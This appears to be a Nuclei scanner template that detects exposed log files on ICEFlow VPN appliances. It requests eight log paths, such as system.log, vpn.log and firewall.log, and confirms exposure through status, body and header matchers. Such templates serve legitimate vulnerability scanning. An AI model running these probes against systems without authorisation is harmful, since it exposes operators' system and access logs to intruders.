id: iceflow-vpn-disclosure

info:
  name: ICEFlow VPN Disclosure
  author: pikpikcu
  severity: low
  metadata:
    max-request: 8
  tags: exposure,files,iceflow,logs
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ICEFlow%20VPN%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md

http:
  - method: GET
    path:
      - "{{BaseURL}}/log/system.log"
      - "{{BaseURL}}/log/vpn.log"
      - "{{BaseURL}}/log/access.log"
      - "{{BaseURL}}/log/warn.log"
      - "{{BaseURL}}/log/error.log"
      - "{{BaseURL}}/log/debug.log"
      - "{{BaseURL}}/log/mobile.log"
      - "{{BaseURL}}/log/firewall.log"

    max-size: 2048

    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'ICEFLOW VPN:'
          - 'ICEFLOW SYSTEM'
          - 'ICEFLOW'
        part: body
        condition: or

      - type: status
        status:
          - 200

      - type: word
        words:
          - "text/plain"
          - 'ICEFLOW'
        part: header
        condition: and

